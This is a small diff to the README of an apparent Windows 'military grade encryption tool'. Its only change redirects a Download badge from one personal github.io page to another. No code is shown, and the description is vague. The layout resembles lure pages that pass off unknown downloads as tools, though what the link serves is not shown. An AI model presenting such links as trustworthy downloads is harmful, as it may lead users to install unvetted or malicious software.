@@ -2,7 +2,7 @@
 
 **military grade encryption tool (Windows)** — Military‑grade Encryption Tool outlines standards‑based ciphers and sane defaults for strong data protection.
 
-[![Download military-grade-encryption-tool](https://img.shields.io/badge/Download-military--grade--encryption--tool-blueviolet)](https://orf-asfx-klinton.github.io/.github/military-grade-encryption-tool)
+[![Download military-grade-encryption-tool](https://img.shields.io/badge/Download-military--grade--encryption--tool-blueviolet)](https://ljubeta060.github.io/.github/military-grade-encryption)
 
 ---
 
